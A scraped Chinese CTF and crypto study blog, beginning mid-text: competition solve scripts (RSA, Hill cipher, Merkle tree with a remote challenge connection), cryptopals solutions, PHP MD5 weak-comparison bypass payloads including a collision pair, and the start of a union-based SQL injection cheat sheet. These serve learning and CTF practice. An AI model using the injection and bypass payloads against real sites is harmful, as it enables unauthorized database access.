for f in fs: print(f, b64decode(f).decode('utf-8', 'ignore')) # 输出文件名和解码之后的文件名果然里面有五个很特殊的文件, 解码之后是正常的字符串.就是后缀带one的文件(其他的是后面解题的文件 winhex打开first_one和last!_one 发现似乎是一个压缩包被拆成五份了.尝试还原回去, 但是不知道中间三个压缩包的顺序. 于是写了个脚本来手动尝试(因为就3个文件就8种组合, 自己调换顺序就行了.123456789101112131415161718192021filename = { 'fi': 'first_one', 'fu': 'funny_one', 'la': 'last!_one', 'sm': 'smart_one', 'cu': 'cute__one'}files = {}for i in filename: with open(filename[i], 'rb') as f: files[i] = f.read()# file =files['fi']+files['fu']+files['cu']+files['sm']+files['la']# file =files['fi']+files['fu']+files['sm']+files['cu']+files['la']# file =files['fi']+files['sm']+files['fu']+files['cu']+files['la']# file =files['fi']+files['sm']+files['cu']+files['fu']+files['la']file = files['fi'] + files['cu'] + files['sm'] + files['fu'] + files['la']with open('out.zip', 'wb') as f: f.write(file)尝试到第五个的时候压缩包就能正常的解压了.解压出来一个flag文件, winhex打开发现文件头是jpg的文件头.后缀改成jpg后打开 Crypto 最喜欢的密码学! 这次想着要做完密码的, 可惜最后一道题没有做出来. 有趣的加密太难了, 附件只有一段像base的编码, 没什么思路….. 碰碰车这题感觉就像是proof_of_work…单纯的爆破md5直接上脚本把1234567891011121314151617from hashlib import md5from string import printable'''md5(AGVSCF?TZV?WBGVHC?U)=a8f738??????5ea5??????80865???af'''STR1 = 'AGVSCF'STR2 = 'TZV'STR3 = 'WBGVHC'STR4 = 'U'for i in printable: for j in printable: for k in printable: STR = STR1 + i + STR2 + j + STR3 + k + STR4 if md5(STR.encode()).hexdigest().startswith('a8f738'): print(STR, md5(STR.encode()).hexdigest())得到结果a8f738a65b715ea54900b180865b20af EasyRSA这题也很简单. 运算一下就可以得到N和phi了(太白给了呀然后正常解rsa就行了脚本如下123456789101112131415from gmpy2 import invertfrom Crypto.Util.number import long_to_bytespandq = 20029167198807103822294848708534176719693827885584335928109682356494141073775700355124993345488062063358756812142730873692437534641839672970148348433433440p2andq2 = 208680638196054793779950396947640995086963335225314494211048436767328157403385847902708950876722819363430805183637917486948883719184952031896287718282687710627112461479842558330512185988841693609451411485248346255881435015800175737788918607504412656254312427601603342579907641505150315471704698521905016530338e = 65537c = 91507581287268678382704102499829526115486105502321675954617344102253738157075000438078155655317661988277710347178352070963528948558320623410799852584156693215831487103699955781123962661928296191496664400110250226880815518273669335738236882265242192523589233915770596106654695524214247405913652100286077779879n = (pandq ** 2 - p2andq2) // 2phi = n - pandq + 1d = invert(e, phi)print(long_to_bytes(pow(c, d, n)))输出就是flag了 Go home这题太迷啦…到现在都还没懂出题人的意思.给出的题目是这样的123n=0xc3d945bc033ff7dd932ba62d8ef506cb37f5fe8e45abdac07660c7ac2af97d3ce723710384046c1bd967e92b0e03666d7c0bcbd4043b39ee128e5a1c98b5367044a4e72a4868fdc4824e8f0f3074da2857a414c9dfd7bf208d41caefeac144a45a6ca225975b0fced05d85d6e95dc7c2fa303c8a69185b75b8b3fd7f3fe0b9b5p = 0xdfe9dd9c9e9987e2fdb230fb346cefa87893afed5d1b4240872ec5b2dfc3b397ecbbf9b54ae6e9b7be150cdc79de1e87d2d674352b857ae4e000000000000000c=0xe1ea04df467b48a7fa372d9374959571a084341041ec71f57e661cedfb517dbf1cc05a305edeb56ce0d2e29a98790a1cd538b31203a8ff7ea79aee1b3ad8629eac19607dce66f9138e3b376a8e915e24d209a23cb8e1a02c6030d840ceb4203一开始拿到题的时候, 确实是没想到这里给的p是p的高位. 知道的话就懂是coppersmith了.所以一开始拿到题是去分解n来着, yafu也确实分出p跟q来了(跟出题人聊了下预期解应该是用coppersmith的因为题目也没给公钥e, 所以试着去爆破了一下e, 然而也没爆出结果.(事实上应该是有结果的, 当e=3的时候肯定能得出结果, 但因为过滤是利用字符串ctf{, 所以没有爆出结果来. 于是就卡住了… 因为p很奇怪(没想到这个是p的高位, 导致我觉得c和p调换过来了. 想看看c是否是素数, 扔进 www.factordb.com 出来了一个意想不到的结果啊这…三次方???于是试着对c开三次方根, 然后转成字符串. 确实得到了在可打印字符范围内的一段字符串1ardyPq2]2lb]A_1q_p]_p1]qm]dsllw{ctf,ard ctf,ard ctf,ard对应字母都是位移2位的!扔进工具里位移回来就得到(所以最后还是想吐槽一下, 能做出这题真的运气max了. block cipher连上远程查看源码, 发现明明是个hill密码!(名字却叫分组密码(狗头很显然加密就是将pad之后的明文分为每16个字节一组,构成4*4的矩阵,每组都和密钥矩阵做模乘模数为256. 所以只需要构造一个在mod256意义下存在逆矩阵的矩阵, 将这个加密后只需要乘上它的逆矩阵就可以得到密钥矩阵了.再求出密钥矩阵的逆矩阵, 就得对密文进行解密. 对于求模256逆矩阵, 只不过是在原先求逆矩阵的基础上将所有的运算改成模256的意义下进行就行了. 为了节省时间, 在网上找到了一个现成的求模逆矩阵的脚本, 然后再修改了一些细节.123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121from gmpy2 import gcdimport numpy as np # 计算行列式的值class MyError(ValueError): pass# 检查矩阵格式是否合法以及是否可逆def check_matrix(A, M): if (not isinstance(A, list)) or (not isinstance(A[0], list)) or (not isinstance(A[0][0], int)): raise MyError('Invalid matrix format.') mat = np.array(A) D = int(np.linalg.det(A)) % M if gcd(D, M) &gt; 1: raise MyError('This matrix does not have a modular inversion matrix.')# 矩阵的第一类初等变换：交换矩阵第i行与第j行def swap(A, i, j): temp = A[j] A[j] = A[i] A[i] = temp# 矩阵的第二类初等变换：将矩阵第i行乘以ndef mul_n(A, i, n, M): a = A[i] A[i] = [a[x] * n % M for x in range(len(a))]# 矩阵的第三类初等变换：矩阵第i行减去n倍的j行def sub(A, i, j, n, M): a = A[i] b = A[j] A[i] = [(a[x] - n * b[x]) % M for x in range(len(a))]# 找到符合要求的第i行def find_row(A, i, M): start = i while A[start][i] == 0 or gcd(A[start][i], M) &gt; 1: start = start + 1 return start# 返回一个整数的模逆元素def mod_rev(num, mod): if (num == 0 or gcd(num, mod) &gt; 1): raise MyError('modular inversion does not exists.') else: i = 1 while i * num % mod != 1: i = i + 1 return idef disp(mat): print('') for i in range(len(mat)): for j in range(len(mat[i])): print(mat[i][j], end='\\t') print('') print('')def matrix_rev(A, M): try: check_matrix(A, M) dim = len(A) # concatenate with a unit matrix for i in range(dim): for j in range(dim): if j == i: A[i].append(1) else: A[i].append(0) # transform for i in range(dim): target_row = find_row(A, i, M) swap(A, i, target_row) n = mod_rev(A[i][i], M) mul_n(A, i, n, M) for j in range(dim): if j != i: sub(A, j, i, A[j][i], M) # get result A_rev = [A[i][dim:] for i in range(dim)] return A_rev except Exception as e: print(e)A = [[42, 42, 42, 43], [42, 42, 41, 44], [42, 41, 42, 42], [41, 42, 42, 42]] # 发送过去的明文的矩阵形式M = 256AINV = matrix_rev(A, M)# A = '***+**),*)**)***' 发送过去的明文encA = '6a9acfbf3dc3bf1265ea2e6a470404c1' # 所返回的密文enc_flag = '1017b9907716c35955305cbd50481660de262f48955ca48a6f97630d2cc7bb2e4f41b2a0bbce4c43575b234fff6455b0' # 加密之后的flagenc_A = np.array([int(encA[i:i + 2], 16) for i in range(0, len(encA), 2)]).reshape(4, 4)key = np.matmul(enc_A, AINV) % 256''' 手动将key转成k的形式了'''k = [[113, 213, 10, 58], [178, 139, 135, 13], [216, 204, 16, 149], [189, 0, 0, 189]]keyinv = np.array(matrix_rev(k, M))for i in range(0, len(enc_flag), 32): encflag = enc_flag[i:i + 32] enc_F = np.array([int(encflag[j:j + 2], 16) for j in range(0, len(encflag), 2)]).reshape(4, 4) f = np.matmul(keyinv, enc_F) % 256 f = f.reshape(16, ) for i in f: print(chr(i), end='')得到flag:ctf{yes-sure-the-plain-is-blocked-right?} ant forest 这题居然只有两个人做真的…可能大家都觉得源码太长了不想看吧?我个人是感觉一点都不难的 题目的源码不贴了. 大概是在建一个默克尔树(这个默克尔树我也是第一次接触.网上找了张图, 就是从底部的叶子开始, 哈希之后两个两个为一组, 相加再哈希得到新的一层, 直到得到根节点. 而题目的要求就是输入两次叶子节点, 两次的输入不能相同但最后的树根是相同的.仔细想想其实并不难, 第二次生成树的叶子节点是第一次生成的树的其中一层就行了.(似乎是叫第二次原像攻击? 知道原理之后就开始写脚本了, 但是过程不太顺利, 因为python3太多数据类型了(转来转去实在是太鸡儿麻烦了… 所以决定用python2写脚本(确实该用py2写不然太乱了…123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960from hashlib import sha256from pwn import *import reprintable = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'def dohash(dat): return sha256(sha256(dat).digest()).digest()con = remote('139.199.203.26', 20002)def proof(END, SHA): for i in printable: for j in printable: for k in printable: for l in printable: start = i + j + k + l ensha = sha256(start + END).hexdigest() if ensha == SHA: print(start) return startresp = con.recvuntil('XXXX:')END = re.findall(r'sha256\\(XXXX\\+(.*)\\)', resp)[0]SHA = re.findall(r'== (.*)', resp)[0]con.sendline(proof(END, SHA))con.recvuntil('&gt;')dic = ['a', 'b', 'c', 'd']for _ in range(4): con.sendline('1') con.recv() con.send(dic[_]) con.recvuntil('&gt;')con.sendline('2')con.recvuntil('&gt;')con.sendline('3')a = dohash('a')b = dohash('b')c = dohash('c')d = dohash('d')ab = a + bcd = dohash(c + d).encode('hex')con.recvuntil(':')con.send(ab)con.recvuntil(':')con.send('r')con.recvuntil(':')con.send(cd)con.recvuntil(':')con.send('k')print con.recvuntil('}')最后得到!Not in leaves? Here is your reward: ctf\\{QUrfLwKFL8Fs3vZbAW4hPrRZFRZ11QosBYQr5jol} 总结这次HWB肝了4天半数学作业堆了好多…不过总的来说还是学到了很多新东西的(新东西都在wp详细写了, 所以有些地方详细有些地方简略.特别是web, 真的学到了很多新东西,也算是收获满满的Misc也是熟悉了很多套路吧不过学了挺久密码但是没有全部做出来太难受了…所以有趣的加密到底该怎么做… 大概就这些了,前面的大佬太强了, 根本打不过…继续加油吧哦对 文章里有错的地方请大佬务必提醒我!","tags":[{"name":"WriteUp","slug":"WriteUp","permalink":"http://tearsjin.github.io/tags/WriteUp/"}]},{"title":"Crypto - onetimepad2, understand the nature of the algorithm","date":"2020-10-29T16:35:09.000Z","path":"2020/10/30/Crypto-onetimepad2-understand-the-nature-of-the-algorithm/","text":"0ctf quals 2017的题, 是之前做过的onetimepad的升级版. 因为这道题涉及到了有限域下乘法, 矩阵乘法, 快速幂, 离散对数, 所以记录一下(学费了学费了… 题目源码先上代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283#!/usr/bin/env python# coding=utf-8from os import urandomdef process1(m, k): res = 0 for i in bin(k)[2:]: res = res &lt;&lt; 1; if (int(i)): res = res ^ m if (res &gt;&gt; 128): res = res ^ P return resdef process2(a, b): res = [] res.append(process1(a[0], b[0]) ^ process1(a[1], b[2])) res.append(process1(a[0], b[1]) ^ process1(a[1], b[3])) res.append(process1(a[2], b[0]) ^ process1(a[3], b[2])) res.append(process1(a[2], b[1]) ^ process1(a[3], b[3])) return resdef nextrand(rand): global N, A, B tmp1 = [1, 0, 0, 1] tmp2 = [A, B, 0, 1] s = N N = process1(N, N) while s: if s % 2: tmp1 = process2(tmp2, tmp1) tmp2 = process2(tmp2, tmp2) s = s / 2 return process1(rand, tmp1[0]) ^ tmp1[1]def keygen(): key = str2num(urandom(16)) while True: yield key key = nextrand(key)def encrypt(message): length = len(message) pad = '\\x00' + urandom(15 - (length % 16)) to_encrypt = message + pad res = '' generator = keygen() f = open('key.txt', 'w') # This is used to decrypt and of course you won't get it. for i, key in zip(range(0, length, 16), generator): f.write(hex(key)+'\\n') res += num2str(str2num(to_encrypt[i:i+16]) ^ key) f.close() return resdef decrypt(ciphertxt): # TODO passdef str2num(s): return int(s.encode('hex'), 16)def num2str(n, block=16): s = hex(n)[2:].strip('L') s = '0' * ((32-len(s)) % 32) + s return s.decode('hex')P = 0x100000000000000000000000000000087A = 0xc6a5777f4dc639d7d1a50d6521e79bfdB = 0x2e18716441db24baf79ff92393735345N = str2num(urandom(16))assert N != 0if __name__ == '__main__': with open('top_secret') as f: top_secret = f.read().strip() assert len(top_secret) == 16 plain = \"One-Time Pad is used here. You won't know that the flag is flag{%s}.\" % top_secret with open('ciphertxt', 'w') as f: f.write(encrypt(plain).encode('hex')+'\\n')整个流程挺简单的, 就是对palin加密. 但是里面的每个函数都挺有意思的. 下面一个一个来分析 process1(m,k)先看process1(m,k)很多时候这种看着就像在一个域里面做的计算, 可以随便几个小的数进去看看结果是什么. 如果是一些简单的操作比如加减乘除啥的一般很容易能看出来.而这个process1(m,k)就是在GF(2^128)下做m*k. 可以理解为就是一个乘法吧. 为什么是个乘法呢?平时纸上算乘法的时候都要用到竖式, 而这里的算法就是一个先计算高位的竖式.从最高位开始一位一位往下乘.(这个用纸上写出来会好理解吧, 这里就不写了 process2(a,b)这个函数就是个矩阵的乘法, 输出的就是 矩阵a * 矩阵b. 怎么看出来?经验? 一般遇到这种两个矩阵(数列)特定下标在进行加和乘计算的, 把每个式子写出来, 看能不能写成两个矩阵之间的操作, 而这里就是一个矩阵的乘法 nextrand(rand)这个函数才是重点!!!123456789101112def nextrand(rand): global N, A, B tmp1 = [1, 0, 0, 1] tmp2 = [A, B, 0, 1] s = N N = process1(N, N) while s: if s % 2: tmp1 = process2(tmp2, tmp1) tmp2 = process2(tmp2, tmp2) s = s / 2 return process1(rand, tmp1[0]) ^ tmp1[1]看不懂的地方就是中间的循环结构, 不知道具体在干什么. 查了一下wp才知道, 这是个快速幂!!!没想到第一次接触快速幂是在密码的题目里… 快速幂简单说一下快速幂吧, 计算机计算一个数的高次幂(例如3^60^)的时候, 如果直接计算60个3相乘就会特别慢, 但是可以把 3^60^ 化成 9^30^, 这样就只需要乘30次了.继续算下去会发生一个问题 3^60^ = 9^30^ = 81^15^ 这里有个15次幂, 如果除以2就是7.5, 7.5次幂是没办法计算的. 所以这里有个操作, 就是81^15^ = 81^14^ 81^1^, 然后继续对81^14^进行化简.所以最终的结果就是1233^60 = 9^30 = 81^15 = 81^14 * 81^1 = 6561^7 + 81^1 =....= 43046721^3 * 43046721^1 * 6561^1 * 81^1= 1853020188851841^1 * 43046721^1 * 6561^1 * 81^1可以看到结果有个特点, 就是最后一定会化成多个数的一次幂的乘积.而什么时候能分出一次幂呢? *就是次幂为奇数的时候!!! 回到函数回到函数里, 结合上面说的快速幂的算法, 可以看出这个循环就是计算tmp1 = tmp2^s, 未完待续….","tags":[{"name":"Crypto","slug":"Crypto","permalink":"http://tearsjin.github.io/tags/Crypto/"},{"name":"Summary","slug":"Summary","permalink":"http://tearsjin.github.io/tags/Summary/"}]},{"title":"PHP Weak type about MD5","date":"2020-10-21T16:02:00.000Z","path":"2020/10/22/web-md5弱类型/","text":"主要就是对一些在PHP中MD5值判断的漏洞的积累吧(每次都要查payload很麻烦的 为了方便, 文章中的所有变量都不带$ 1. a != b and md5(a) == md5(b) 用==来判断两个变量(这样写肯定会被学长骂的!!!, 怎么绕过呢?先给出两个字符串吧QNKCDZO 和 240610708 而这两个字符串的MD5值为120e8304004519934940580242199033910e462097431906509019562988736854PHP在处理哈希字符串时, 它把每一个以“0E”开头的哈希值都解释为0, 具体的原因呢是因为0e开头会被认为是科学计数法, e后面的数会被认为是次幂, 而不管0乘10的几次幂都是0. 所以如果两个不同的密码经过哈希以后, 其哈希值都是以“0E”开头的, 那么PHP将会认为他们相同, 都是0. 2. a !== b and md5(a) === md5(b)要通过这个判断, 要利用MD5不能处理数组这个漏洞, 就是说当a和b都是数组的时候, md5(a) === md5(b) 会判断为真. 至于怎么让a !== b, a[]=1;b[]=2就行了. 3. (string)a !== (string)b and md5(a) === md5(b)啊这…这个可以直接去找两个相等md5的字符串.123$Param1=\"\\x4d\\xc9\\x68\\xff\\x0e\\xe3\\x5c\\x20\\x95\\x72\\xd4\\x77\\x7b\\x72\\x15\\x87\\xd3\\x6f\\xa7\\xb2\\x1b\\xdc\\x56\\xb7\\x4a\\x3d\\xc0\\x78\\x3e\\x7b\\x95\\x18\\xaf\\xbf\\xa2\\x00\\xa8\\x28\\x4b\\xf3\\x6e\\x8e\\x4b\\x55\\xb3\\x5f\\x42\\x75\\x93\\xd8\\x49\\x67\\x6d\\xa0\\xd1\\x55\\x5d\\x83\\x60\\xfb\\x5f\\x07\\xfe\\xa2\";$Param2=\"\\x4d\\xc9\\x68\\xff\\x0e\\xe3\\x5c\\x20\\x95\\x72\\xd4\\x77\\x7b\\x72\\x15\\x87\\xd3\\x6f\\xa7\\xb2\\x1b\\xdc\\x56\\xb7\\x4a\\x3d\\xc0\\x78\\x3e\\x7b\\x95\\x18\\xaf\\xbf\\xa2\\x02\\xa8\\x28\\x4b\\xf3\\x6e\\x8e\\x4b\\x55\\xb3\\x5f\\x42\\x75\\x93\\xd8\\x49\\x67\\x6d\\xa0\\xd1\\xd5\\x5d\\x83\\x60\\xfb\\x5f\\x07\\xfe\\xa2\";#008ee33a9d58b51cfeb425b0959121c9使用的时候记得直接添加到包里面去, 浏览器上输入是无效的","tags":[{"name":"Web","slug":"Web","permalink":"http://tearsjin.github.io/tags/Web/"},{"name":"MD5","slug":"MD5","permalink":"http://tearsjin.github.io/tags/MD5/"}]},{"title":"cryptopals","date":"2020-10-10T07:51:07.000Z","path":"2020/10/10/cryptopals/","text":"开始学习cryptopals啦, 一题一题的做完它吧(也不知道能做多久… 目录 cryptopals 1.1 - Convert hex to base64 cryptopals 1.2 - Fixed XOR cryptopals 1.3 - Single-byte XOR cipher cryptopals 1.4 - Detect single-character XOR cryptopals 1.5 - Implement repeating-key XOR cryptopals 1.6 - Break repeating-key XOR cryptopals 1.7 - AES in ECB mode cryptopals 1.8 - Detect AES in ECB mode cryptopals 1.1 - Convert hex to base64challenge The string: 149276d206b696c6c696e6720796f757220627261696e206c696b65206120706f69736f6e6f7573206d757368726f6f6d Should produce: 1SSdtIGtpbGxpbmcgeW91ciBicmFpbiBsaWtlIGEgcG9pc29ub3VzIG11c2hyb29t So go ahead and make that happen. You’ll need to use this code for the rest of the exercises. 大概就是手动写一个hex2base64的脚本吧 Base64写之前先去了解一下hex转base64的原理(wiki真不错Base64是一种基于64个可打印字符来表示二进制数据的表示方法。由于 ，所以每6个比特为一个单元，对应某个可打印字符。3个字节相当于24个比特，对应于4个Base64单元，即3个字节可由4个可打印字符来表示。 转换的时候，将3字节的数据，先后放入一个24位的缓冲区中，先来的字节占高位。数据不足3字节的话，于缓冲器中剩下的比特用0补足。每次取出6比特，按照其值选择 12ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/ 中的字符作为编码后的输出，直到全部输入数据转换完成。 若原数据长度不是3的倍数时且剩下1个输入数据，则在编码结果后加2个=；若剩下2个输入数据，则在编码结果后加1个=。 脚本知道原理就好写脚本了12345678910111213141516171819202122232425262728293031323334353637def padding(Hex): if len(Hex) % 6: return Hex + '0' * (6 - len(Hex) % 6) return Hexdef encodeb64(Hex): Hex = padding(Hex) output = '' for i in range(0, len(Hex), 6): buff = bin(int(Hex[i:i + 6], 16))[2:] buff = '0' * (24 - len(buff)) + buff for j in range(0, len(buff), 6): value = int(buff[j:j + 6], 2) if value == 0: output += '=' elif value &lt; 26: output += chr(value + 65) elif value &lt; 52: output += chr(value + 71) elif value &lt; 62: output += str(value - 52) elif value == 62: output += '+' else: output += '/' return outputdef main(): Hex = '49276d206b696c6c696e6720796f757220627261696e206c696b65206120706f69736f6e6f7573206d757368726f6f6d' print(encodeb64(Hex))if __name__ == '__main__': main() cryptopals 1.2 - Fixed XOR题目 Write a function that takes two equal-length buffers and produces their XOR combination. If your function works properly, then when you feed it the string:11c0111001f010100061a024b53535009181c… after hex decoding, and when XOR’d against:1686974207468652062756c6c277320657965… should produce:1746865206b696420646f6e277420706c6179相同长度的十六进制的xor, 一位一位的xor就行了吧 脚本1234567891011121314def fixex_xor(Hex1, Hex2): res = '' for i, j in zip(Hex1, Hex2): res += hex(int(i, 16) ^ int(j, 16))[2:] return resdef main(): Hex1 = '1c0111001f010100061a024b53535009181c' Hex2 = '686974207468652062756c6c277320657965' print(fixex_xor(Hex1, Hex2))if __name__ == '__main__': main() 还是比较简单的,后面就不一定了Orz cryptopals 1.3 - Single-byte XOR cipher 从这里开始难度突然就上升了 题目 The hex encoded string:11b37373331363f78151b7f2b783431333d78397828372d363c78373e783a393b3736… has been XOR’d against a single character. Find the key, decrypt the message. You can do this by hand. But don’t: write code to do it for you. How? Devise some method for “scoring” a piece of English plaintext. Character frequency is a good metric. Evaluate each output and choose the one with the best score. 说是一段文字被单个字符(8bit)异或加密了, 要找出这个字符然后输出明文, 密钥空间为, 也不算多, 但是如何让程序找出唯一一个正确的字符? 提示上有提到可以利用解密后的字符串的”得分”. 查了一下, 在一个dalao的博客上找到的这个得分应该叫字符频率(dalao说wiki上有字符频率表, 但我没找到, 就连这个”得分”的相关内容都没找到), 但是还好他的博客里附带了一个字符频率的数组. 12345CHARACTER_FREQ = { #字符频率表, 出现一次某字母的得分 'a': 0.0651738, 'b': 0.0124248, 'c': 0.0217339, 'd': 0.0349835, 'e': 0.1041442, 'f': 0.0197881, 'g': 0.0158610, 'h': 0.0492888, 'i': 0.0558094, 'j': 0.0009033, 'k': 0.0050529, 'l': 0.0331490, 'm': 0.0202124, 'n': 0.0564513, 'o': 0.0596302, 'p': 0.0137645, 'q': 0.0008606, 'r': 0.0497563, 's': 0.0515760, 't': 0.0729357, 'u': 0.0225134, 'v': 0.0082903, 'w': 0.0171272, 'x': 0.0013692, 'y': 0.0145984, 'z': 0.0007836, ' ': 0.1918182} 通过这个字符频率表, 可以定量的分析每次解密结果的得分, 得分最高就代表最接近正常英文语句(或者说文章). 脚本1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950CHARACTER_FREQ = { # 字符频率表, 出现一次某字母的得分 'a': 0.0651738, 'b': 0.0124248, 'c': 0.0217339, 'd': 0.0349835, 'e': 0.1041442, 'f': 0.0197881, 'g': 0.0158610, 'h': 0.0492888, 'i': 0.0558094, 'j': 0.0009033, 'k': 0.0050529, 'l': 0.0331490, 'm': 0.0202124, 'n': 0.0564513, 'o': 0.0596302, 'p': 0.0137645, 'q': 0.0008606, 'r': 0.0497563, 's': 0.0515760, 't': 0.0729357, 'u': 0.0225134, 'v': 0.0082903, 'w': 0.0171272, 'x': 0.0013692, 'y': 0.0145984, 'z': 0.0007836, ' ': 0.1918182}from Set1.Fixed_XOR import fixed_xordef hex2text(Hex): h = Hex if len(h) % 2 == 1: t = '0' + h return ''.join([chr(int(b, 16)) for b in [h[i:i + 2] for i in range(0, len(h), 2)]])def keygen(LEN): for i in range(256): yield ((2 - len(hex(i)[2:])) * '0' + hex(i)[2:]) * (LEN // 2)def getscore(text): score = 0 for i in text: i = i.lower() if i in CHARACTER_FREQ: score += CHARACTER_FREQ[i] return scoredef attack(cipher): generator = keygen(len(cipher)) res = [] for i in generator: plain = hex2text(fixed_xor(cipher, i)) score = getscore(plain) res.append([plain, score, i]) return resdef main(): cipher = '1b37373331363f78151b7f2b783431333d78397828372d363c78373e783a393b3736' max = [0, -1] for i in attack(cipher): if max[1] &lt; i[1]: max = i print(max)if __name__ == '__main__': main() 关于最后面的排序, 看了相关文章发现其实可以用sorted()函数 直接举例子, 简单易懂 对键排序123dict1={'a':2,'e':3,'f':8,'d':4}list1= sorted(dict1.items(),key=lambda x:x[0])print(list1) 2.对值排序123dict1={'a':2,'e':3,'f':8,'d':4}list1= sorted(dict1.items(),key=lambda x:x[1])print(list1) 借用大佬的代码, 其实attack函数可以写成12345678def attack(cipher): generator = keygen(len(cipher)) res = [] for i in generator: plain = hex2text(fixed_xor(cipher, i)) score = getscore(plain) res.append({'key': key, 'plaintext': plaintext, 'score': score}) return sorted(res, key = lambda c:c['score']) cryptopals 1.4 - Detect single-character XOR题目 One of the 60-character strings in this file has been encrypted by single-character XOR. Find it. (Your code from #3 should help.) 意思是说, 在那个文件里面的60个字符串里面, 有一个是被xor加密过后的(一开始读题还以为是60个都是被加密的), 让我们找到他并且解密出来. 其实跟1.3没什么区别, 只是从1组里面选得分最高的密钥变成先根据密钥选出1组里面最高分的, 再选出60个字符串里面最高分的那组. 脚本123456789101112131415161718from Single_byte_XOR_cipher import *def main(): cipher = '' res = [] with open('4.txt', 'r') as f: while True: cipher = f.readline()[:-1] if cipher == '': break res.append(attack(cipher)[-1]) print(sorted(res, key=lambda x: x['score'])[-1])if __name__ == '__main__': main() cryptopals 1.5 - Implement repeating-key XOR题目 Here is the opening stanza of an important work of the English language:12Burning 'em, if you ain't quick and nimbleI go crazy when I hear a cymbalEncrypt it, under the key “ICE”, using repeating-key XOR. In repeating-key XOR, you’ll sequentially apply each byte of the key; the first byte of plaintext will be XOR’d against I, the next C, the next E, then I again for the 4th byte, and so on. It should come out to:120b3637272a2b2e63622c2e69692a23693a2a3c6324202d623d63343c2a26226324272765272a282b2f20430a652e2c652a3124333a653e2b2027630c692b20283165286326302e27282fEncrypt a bunch of stuff using your repeating-key XOR function. Encrypt your mail. Encrypt your password file. Your .sig file. Get a feel for it. I promise, we aren’t wasting your time with this. 题目升级了!!! 脚本写完脚本才发现他是要我加密, 而不是解密, 所以只好再写一个加密的了 解密123456789101112131415161718192021222324from Fixed_XOR import fixed_xorfrom Single_byte_XOR_cipher import hex2textdef keypadding(ciplen, key): return ''.join([key[i % len(key)] for i in range(ciplen)])def text2hex(text): return ''.join(hex(ord(i))[2:] for i in text)def main(): cipher = '0b3637272a2b2e63622c2e69692a23693a2a3c6324202d623d63343c2a26226324272765272\\na282b2f20430a652e2c652a3124333a653e2b2027630c692b20283165286326302e27282f' key = 'ICE' cipher = ''.join(cipher.split('\\n')) padkey = text2hex(keypadding(len(cipher), key)) res = hex2text(fixed_xor(cipher, padkey)) print(res)if __name__ == '__main__': main() 加密1234567891011121314151617181920212223from Fixed_XOR import fixed_xordef keypadding(ciplen, key): return ''.join([key[i % len(key)] for i in range(ciplen)])def text2hex(text): return ''.join(hex(ord(i))[2:] for i in text)def main(): plain = \"Burning 'em, if you ain't quick and nimble I go crazy when I hear a cymbal\" key = 'ICE' padkey = keypadding(len(plain), key) hexplain = text2hex(plain) hexpadkey = text2hex(padkey) print(fixed_xor(hexplain, hexpadkey))if __name__ == '__main__': main() cryptopals 1.6 - Break repeating-key XOR题目 There’s a file here. It’s been base64’d after being encrypted with repeating-key XOR. Decrypt it. Here’s how: Let KEYSIZE be the guessed length of the key; try values from 2 to (say) 40. Write a function to compute the edit distance/Hamming distance between two strings. The Hamming distance is just the number of differing bits. The distance between:this is a test and wokka wokka!!! is 37. Make sure your code agrees before you proceed. For each KEYSIZE, take the first KEYSIZE worth of bytes, and the second KEYSIZE worth of bytes, and find the edit distance between them. Normalize this result by dividing by KEYSIZE. The KEYSIZE with the smallest normalized edit distance is probably the key. You could proceed perhaps with the smallest 2-3 KEYSIZE values. Or take 4 KEYSIZE blocks instead of 2 and average the distances. Now that you probably know the KEYSIZE: break the ciphertext into blocks of KEYSIZE length. Now transpose the blocks: make a block that is the first byte of every block, and a block that is the second byte of every block, and so on. Solve each block as if it was single-character XOR. You already have code to do this. For each block, the single-byte XOR key that produces the best looking histogram is the repeating-key XOR key byte for that block. Put them together and you have the key. This code is going to turn out to be surprisingly useful later on. Breaking repeating-key XOR (“Vigenere”) statistically is obviously an academic exercise, a “Crypto 101” thing. But more people “know how” to break it than can actually break it, and a similar technique breaks something much more important. cryptopals 1.7 - AES in ECB mode题目 The Base64-encoded content in this file has been encrypted via AES-128 in ECB mode under the key \"YELLOW SUBMARINE\". (case-sensitive, without the quotes; exactly 16 characters; I like “YELLOW SUBMARINE” because it’s exactly 16 bytes long, and now you do too). Decrypt it. You know the key, after all. Easiest way: use OpenSSL::Cipher and give it AES-128-ECB as the cipher. You can obviously decrypt this using the OpenSSL command-line tool, but we’re having you get ECB working in code for a reason. You’ll need it a lot later on, and not just for attacking ECB. 未完待续… cryptopals 1.8 - Detect AES in ECB mode题目In this file are a bunch of hex-encoded ciphertexts. One of them has been encrypted with ECB. Detect it. Remember that the problem with ECB is that it is stateless and deterministic; the same 16 byte plaintext block will always produce the same 16 byte ciphertext. 未完待续…","tags":[{"name":"Crypto","slug":"Crypto","permalink":"http://tearsjin.github.io/tags/Crypto/"},{"name":"cryptopals","slug":"cryptopals","permalink":"http://tearsjin.github.io/tags/cryptopals/"}]},{"title":"Experience summary of SQL injection","date":"2020-09-29T09:16:53.000Z","path":"2020/09/29/SQL注入经验大杂烩/","text":"一般注入通过修改参数的值, 例如正常数字 大数字 字符 单引号 双引号 括号 反斜杠等等来探测是否存在注入点. 如果有报错信息, 则可以根据报错信息还原SQL语句. 例如在数字后面加 ‘ 不行则可以试试加 \\ 注入操作(找到注入点并还原SQL语句后) 利用order by来判断字段数(联合查询需要相同的字段) 得到字段数后, 判断显位. 例如url?id=-1' union select 1,2,3, 观察哪个数字会显示出来. 获取数据库名(显位是2的情况下,下面也是) union select 1,database(),3 select 1 , group_concat(schema_name) , 3 from information_schema.schemata 列出数据库中所有表(假设库名是test) select group_concat(table_name) from information_schema.tables where table_schema = test 如果不行 可以试试'test' 0x674657374(把test转成十六进制) database() 列出所有字段 select group_concat(column_name) from information_schema,columns where table_name = 爆数据就完事了 盲注跟一般注入的区别在于, 服务端不再返回报错内容, 注入的时候只能知道自己输入的语句是否出错, 而且也不能直接得到库名表名这些. 盲注一般分为两种, 一种是基于布尔的, 一种是基于时间的. 相关函数使用盲注得知道一些函数: 